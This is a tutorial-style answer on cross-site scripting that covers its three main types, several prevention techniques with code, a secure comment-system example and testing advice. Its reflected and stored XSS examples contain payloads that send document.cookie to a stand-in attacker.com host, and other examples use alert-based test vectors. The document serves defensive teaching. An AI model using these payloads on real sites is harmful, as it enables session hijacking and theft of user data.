# What is Cross-Site Scripting (XSS) and how can you prevent it?

**Answer:**

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. The injected code runs in the context of the victim's browser with the same privileges as legitimate scripts from the site, potentially allowing attackers to steal sensitive information, hijack user sessions, or perform actions on behalf of the victim.

## Types of XSS Attacks

### 1. Reflected XSS

In a reflected XSS attack, the malicious script is included in a request sent to the server and reflected back in the server's immediate response.

**Example:**
An attacker crafts a link like:
```
https://example.com/search?query=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>
```

If the server returns the search query without sanitization (e.g., in a "You searched for: [query]" message), the script will execute when a victim clicks the link.

### 2. Stored XSS

In a stored XSS attack, the malicious script is permanently stored on the target server (e.g., in a database, comment field, forum post). The script is then retrieved and executed by victims when they view the affected page.

**Example:**
An attacker posts a comment on a blog containing:
```html
Great article! <script>fetch('https://attacker.com/steal-data', { method: 'POST', body: JSON.stringify({ cookies: document.cookie }) });</script>
```

If the comment system doesn't properly sanitize the input, every user viewing comments will execute the malicious script.

### 3. DOM-based XSS

In DOM-based XSS, the vulnerability exists in client-side code rather than server-side code. The attack payload doesn't need to reach the server but is executed when the JavaScript code processes data from an untrusted source (like URL parameters).

**Example:**
```javascript
// Dangerous code that takes a parameter from the URL
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

An attacker can exploit this with a URL like:
```
https://example.com/welcome?name=<img src=x onerror=alert(document.cookie)>
```

## Prevention Techniques

### 1. Output Encoding/Escaping

Always encode/escape user-generated content before inserting it into HTML, JavaScript, CSS, or URLs.

```javascript
// Instead of:
document.getElementById('userDiv').innerHTML = userName;

// Do this:
const textNode = document.createTextNode(userName);
document.getElementById('userDiv').appendChild(textNode);

// Or with a library like DOMPurify:
import DOMPurify from 'dompurify';
document.getElementById('userDiv').innerHTML = DOMPurify.sanitize(userName);
```

### 2. Content Security Policy (CSP)

Implement CSP headers to restrict the sources from which various types of content can be loaded and whether inline scripts can execute.

```http
// HTTP header
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
```

Or using a meta tag:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';">
```

### 3. Use Modern Frameworks

Modern JavaScript frameworks like React, Angular, and Vue automatically escape content by default when using their templating systems.

```jsx
// React example - safe by default
return <div>{userInput}</div>;

// Only use dangerouslySetInnerHTML when you're certain content is safe
return <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
```

### 4. Input Validation

Validate and sanitize input on both client and server sides. Use whitelist validation when possible.

```javascript
// Server-side validation example (Node.js)
const sanitizeHtml = require('sanitize-html');

app.post('/comment', (req, res) => {
  // Sanitize the input
  const cleanComment = sanitizeHtml(req.body.comment, {
    allowedTags: ['b', 'i', 'em', 'strong'],
    allowedAttributes: {}
  });
  
  // Save to database
  saveComment(cleanComment);
});
```

### 5. Use HttpOnly Cookies

Protect sensitive cookies by setting the HttpOnly flag, which prevents JavaScript from accessing cookies.

```javascript
// Express.js example
res.cookie('sessionId', 'abc123', {
  httpOnly: true,
  secure: true,  // Also use HTTPS
  sameSite: 'strict'  // Protection against CSRF
});
```

### 6. X-XSS-Protection Header

Enable the browser's built-in XSS filter (though this is becoming less relevant as modern browsers implement other protections).

```http
X-XSS-Protection: 1; mode=block
```

### 7. Implement Context-Specific Escaping

Different contexts require different escaping strategies:

```javascript
// HTML context
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// JavaScript context
function escapeJs(str) {
  return JSON.stringify(str).slice(1, -1)
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}

// URL context
function escapeUrl(str) {
  return encodeURIComponent(str);
}
```

### 8. Sanitize HTML with Libraries

Use proven libraries for HTML sanitization:

```javascript
// DOMPurify example
import DOMPurify from 'dompurify';

const userHtml = '<a href="javascript:alert(1)">Click me</a>';
const clean = DOMPurify.sanitize(userHtml);
// Result: '<a>Click me</a>' (javascript: protocol removed)
```

### 9. Regular Security Audits

Regularly review your code for XSS vulnerabilities, particularly when handling user input. Automated tools can help identify potential issues.

## Real-World Example: Comment System

Here's how a secure comment system might handle user input to prevent XSS:

```javascript
// Client-side submission handler
async function submitComment(event) {
  event.preventDefault();
  
  const commentText = document.getElementById('commentText').value;
  
  // Client-side validation
  if (commentText.length < 5 || commentText.length > 1000) {
    showError('Comment must be between 5 and 1000 characters');
    return;
  }
  
  try {
    const response = await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: commentText })
    });
    
    if (!response.ok) throw new Error('Server error');
    
    // Clear the form and refresh comments
    document.getElementById('commentText').value = '';
    loadComments();
  } catch (error) {
    showError('Failed to submit comment');
    console.error(error);
  }
}

// Server-side handler (Node.js/Express)
app.post('/api/comments', (req, res) => {
  const { text } = req.body;
  
  // Server-side validation
  if (typeof text !== 'string' || text.length < 5 || text.length > 1000) {
    return res.status(400).json({ error: 'Invalid comment text' });
  }
  
  // Sanitize HTML (if HTML is allowed)
  const sanitizedText = sanitizeHtml(text, {
    allowedTags: ['b', 'i', 'em', 'strong'],
    allowedAttributes: {}
  });
  
  // Save to database
  // ...
  
  res.status(201).json({ message: 'Comment added successfully' });
});

// Displaying comments safely
function displayComments(comments) {
  const container = document.getElementById('comments');
  container.innerHTML = ''; // Clear existing comments
  
  comments.forEach(comment => {
    const commentEl = document.createElement('div');
    commentEl.className = 'comment';
    
    // Option 1: Text only (safest)
    const textEl = document.createElement('p');
    textEl.textContent = comment.text; // Safe, auto-escapes
    
    // Option 2: Allow limited HTML (if required)
    // const textEl = document.createElement('p');
    // textEl.innerHTML = DOMPurify.sanitize(comment.text);
    
    commentEl.appendChild(textEl);
    container.appendChild(commentEl);
  });
}
```

## Common Mistakes and Misconceptions

1. **Relying only on client-side validation**: Always validate and sanitize on the server side as well.

2. **Insufficient escaping**: Different contexts (HTML, JavaScript, URLs) require different escaping strategies.

3. **Using innerHTML with unsanitized content**: Even if you trust the content source, using `innerHTML` with unsanitized content is risky.

4. **Believing blacklist filtering is enough**: Attackers can often bypass blacklist filters. Prefer whitelist approaches.

5. **Thinking HTTPS prevents XSS**: HTTPS encrypts data in transit but doesn't prevent XSS attacks.

## Testing for XSS Vulnerabilities

Test your applications for XSS vulnerabilities using these techniques:

1. **Manual testing**: Input test vectors like `<script>alert('XSS')</script>` into forms and URL parameters.

2. **Automated scanners**: Use tools like OWASP ZAP, Burp Suite, or specialized XSS scanners.

3. **Code reviews**: Specifically look for places where user input is rendered to the page.

4. **Bug bounty programs**: Consider setting up a bug bounty program for your organization.